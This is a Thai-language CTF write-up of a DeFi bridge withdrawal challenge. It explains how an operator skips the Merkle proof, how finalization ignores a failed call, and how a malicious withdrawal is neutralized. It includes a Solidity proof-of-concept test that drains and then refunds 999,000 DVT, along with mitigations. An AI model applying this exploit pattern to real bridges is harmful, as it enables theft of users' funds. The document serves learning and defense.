- `L1Gateway.finalizeWithdrawal()` ให้คนที่มี `OPERATOR_ROLE` (ซึ่งก็คือ player) finalize withdrawal ได้โดยใช้ Merkle proof เปล่า
- ฟังก์ชันนี้ mark leaf ว่า finalized และเพิ่ม counter ก่อนเรียก external call แล้วไม่สนว่า call นั้นสำเร็จหรือไม่ withdrawal จึงถูก finalize ได้ทั้งที่การโอน token ล้มเหลว
- ใน withdrawal 4 รายการ มี 3 รายการที่ถูกต้อง (โอนรายการละ 10 DVT) และมี 1 รายการ (index 2) เป็นตัวอันตรายที่ดึง 999,000 DVT จนทำให้ bridge หมดตัว
### วิธีโจมตี :
- ใช้ `vm.warp` ข้ามช่วง dalay แล้ว replay payload จาก `withdrawals.json` ในฐานะ operator จากนั้นดำเนินการโดย
  1. finalize 3 รายการที่ถูกต้อง
  2. finalize รายการที่เราสร้างขึ้นเองเพื่อดึง 999,000 DVT มาให้ player ทำให้ bridge ว่างเปล่า
  3. finalize withdrawal ที่เป็นตัวอันตราย จากนั้น `TokenBridge.executeTokenWithdrawal` จะรัน `totalDeposits -= 999_000e18` ซึ่ง underflow แล้ว revert ทำให้ leaf บันทึกว่า finalized แต่ token ไม่ขยับ
  4. โอน 999,000 DVT คืนเข้า bridge (player เหลือ 0)
### การป้องกัน :
- ไม่ให้ role พิเศษข้ามการตรวจ proof ได้, ตรวจให้แน่ว่า message ทำงานสำเร็จจริงก่อน mark ว่า finalized (เช็คค่า return / การ revert ของ call), และตั้งเพดานจำนวนเงินต่อ withdrawal จะได้ไม่มี message เดียวที่ดึงเงินออกจาก bridge ได้หมด
### POC
```solidity
function test_withdrawal() public checkSolvedByPlayer {
    // player = OPERATOR_ROLE จึงข้ามการตรวจ merkle proof ได้ แค่ข้าม delay 7 วันด้วย vm.warp
    vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);

    bytes32[] memory noProof = new bytes32[](0);
    string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

    // 1) finalize 3 รายการที่ถูกต้อง (index 0,1,3 รายการละ 10 DVT)
    uint256[3] memory legit = [uint256(0), 1, 3];
    for (uint256 j = 0; j < legit.length; j++) {
        (, uint256 timestamp, bytes memory message) = abi.decode(
            vm.parseJsonBytes(logs, string.concat("[", vm.toString(legit[j]), "].data")),
            (bytes32, uint256, bytes)
        );
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, string.concat("[", vm.toString(legit[j]), "].topics[1]"))),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 2) withdrawal อันตราย (index 2) ดึง 999,000 DVT จนทำให้ bridge หมดตัว
    // เราเลยสร้าง withdrawal ของเราเองไปดึงเงินออกจาก bridge ไปที่ player ก่อน
    // พอ finalize index 2 เสร็จ `totalDeposits -= 999_000e18` จะ underflow แล้ว revert
    // แต่ finalizeWithdrawal mark leaf ไว้ก่อนเรียก call และไม่สนผลลัพธ์ ค่าเลยเป็น finalized อยู่
    uint256 drain = 999_000e18;
    bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
    bytes memory fwd = abi.encodeWithSignature(
        "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
    );
    // l2Sender = l2Handler ทำให้เช็ค xSender ของ L1Forwarder ผ่าน
    l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

    // 3) finalize withdrawal อันตราย (index 2) การโอนข้างในล้มเหลวเพราะ underflow แต่ยังถูก mark ว่า finalized
    {
        (, uint256 timestamp, bytes memory message) =
            abi.decode(vm.parseJsonBytes(logs, "[2].data"), (bytes32, uint256, bytes));
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, "[2].topics[1]")),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 4) โอน token ที่ดึงมาชั่วคราวคืนกลับไปที่ bridge (player เหลือ 0 ในตอนจบ)
    token.transfer(address(l1TokenBridge), drain);
}
```
